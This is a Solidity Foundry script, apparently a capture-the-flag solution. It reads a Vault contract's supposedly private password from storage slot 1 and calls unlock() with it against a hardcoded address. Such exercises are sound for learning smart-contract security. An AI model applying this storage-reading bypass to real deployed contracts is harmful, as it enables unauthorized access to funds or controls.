// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";
import { console } from "forge-std/console.sol";

import { Vault } from "src/Vault/Vault.sol";
import { toBytes } from "src/utils/toBytes.sol";
import { bytes32ToString } from "src/utils/toString.sol";

contract VaultAttackScript is Script {
    function run() public {
        address vaultInstance = address(0x0Fa9325F9B7c8fD3935F76bbfd9f2d4a17c1128b);
        vm.startBroadcast();
            // get address from storage slot 1 on the Vault instance
            bytes32 storedPassword = vm.load(vaultInstance, bytes32(toBytes(1)));
            // found it!
            console.logString(bytes32ToString(storedPassword));

            console.logString("Are we locked??");
            bool locked = Vault(vaultInstance).locked();
            console.logBool(locked);
            // call the Vault unlock function to move on...
            Vault(vaultInstance).unlock(storedPassword);
            console.logString("How about now?");
            locked = Vault(vaultInstance).locked();
            console.logBool(locked);
        vm.stopBroadcast();
    }
}